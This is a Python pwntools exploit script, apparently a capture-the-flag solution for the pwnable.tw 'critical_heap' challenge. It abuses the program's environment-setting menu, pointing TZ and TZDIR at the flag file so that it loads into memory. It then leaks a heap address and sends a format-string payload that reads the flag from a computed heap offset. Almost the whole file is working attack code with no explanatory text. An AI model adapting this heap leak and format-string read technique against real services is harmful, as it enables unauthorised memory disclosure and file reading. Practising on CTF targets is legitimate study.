#!/usr/bin/env python

from pwn import *

# r = process('./critical_heap')
# r = remote('0', 56746)
r = remote('chall.pwnable.tw', 10500)

def sendlineafter(deli, data):
    r.sendlineafter(deli, data)
    time.sleep(0.1)

def create(name, ty, data = ''):
    sendlineafter(':', '1')
    sendlineafter(':', name)
    sendlineafter(':', str(ty))
    if ty == 1:
        sendlineafter(':', data)

def show(idx):
    sendlineafter(':', '2')
    sendlineafter(':', str(idx))

def rename(idx, name):
    sendlineafter(':', '3')
    sendlineafter(':', str(idx))
    sendlineafter(':', name)

def play_clock(idx, ty, fin = True):
    sendlineafter(':', '4')
    sendlineafter(':', str(idx))
    sendlineafter(':', str(ty))
    if fin:
        sendlineafter(':', '3')

def play_normal(idx, ty, data = '', fin = True):
    sendlineafter(':', '4')
    sendlineafter(':', str(idx))
    sendlineafter(':', str(ty))
    ans = ''
    if ty == 1:
        r.recvuntil(':')
        ans = r.recvuntil('*****************************')
    elif ty == 2:
        sendlineafter(':', data)
    if fin:
        sendlineafter(':', '3')
    return ans

def play_system(idx, ty, name = '', data = '', fin = True):
    sendlineafter(':', '4')
    sendlineafter(':', str(idx))
    sendlineafter(':', str(ty))
    if ty == 2 or ty == 4:
        sendlineafter(':', name)
    elif ty == 1:
        sendlineafter(':', name)
        sendlineafter(':', data)
    if fin:
        sendlineafter(':', '5')

def delete(idx):
    sendlineafter(':', '5')
    sendlineafter(':', str(idx))

create('cccc', 1, 'lala') # 0
create('aaaa', 3) # 1
play_system(1, 1, 'TZ', 'flag')
play_system(1, 1, 'TZDIR', '/home/critical_heap++')
create('bbbb', 2) # 2

play_normal(0, 2, 'a' * 40)
res = play_normal(0, 1)

heap = u64((res[58:-29]).ljust(8, '\x00')) - 0x30
log.info(hex(heap))

flag_off = 0x520

create('dddd', 1, 'lala') # 3
play_normal(3, 2, '%c' * 11 + '%s' + p64(heap + flag_off), fin = False)
sendlineafter(':', '1')

r.interactive()
